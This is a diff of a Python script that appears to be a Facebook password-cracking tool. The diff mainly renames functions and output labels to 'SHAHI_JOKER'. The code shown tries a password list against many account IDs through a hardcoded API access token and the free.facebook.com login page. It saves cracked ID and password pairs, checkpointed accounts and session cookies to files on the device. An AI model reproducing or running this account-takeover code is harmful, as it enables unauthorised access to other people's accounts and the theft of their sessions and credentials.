@@ -1376,10 +1376,10 @@ def 🄹🄾🄺🄴🅁3(ids,passlist):
         except Exception as e:
                 pass
 #method4
-def 🄹🄾🄺🄴🅁4(ids,passlist):
+def SHAHI_JOKER4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1448,11 +1448,11 @@ def 🄹🄾🄺🄴🅁4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/🄹🄾🄺🄴🅁-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/SHAHI_JOKER-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/SHAHI_JOKER-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1462,8 +1462,8 @@ def 🄹🄾🄺🄴🅁4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1471,10 +1471,10 @@ def 🄹🄾🄺🄴🅁4(ids,passlist):
         except Exception as e:
                 pass
 #method5
-def 🄹🄾🄺🄴🅁5(ids,passlist):
+def SHAHI_JOKER5(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1543,8 +1543,8 @@ def 🄹🄾🄺🄴🅁5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1554,8 +1554,8 @@ def 🄹🄾🄺🄴🅁5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1563,12 +1563,12 @@ def 🄹🄾🄺🄴🅁5(ids,passlist):
         except Exception as e:
                 pass
 #method6
-def 🄹🄾🄺🄴🅁6(ids,passlist):
+def SHAHI_JOKER6(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1609,10 +1609,10 @@ def 🄹🄾🄺🄴🅁6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [🄹🄾🄺🄴🅁-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [SHAHI_JOKER-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [🄹🄾🄺🄴🅁-OK] '+uid+' | '+pas)
-						open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						print(f'\r\x1b[1;32m [SHAHI_JOKER-OK] '+uid+' | '+pas)
+						open('/sdcard/SHAHI_JOKER-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1620,8 +1620,8 @@ def 🄹🄾🄺🄴🅁6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/SHAHI_JOKER-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
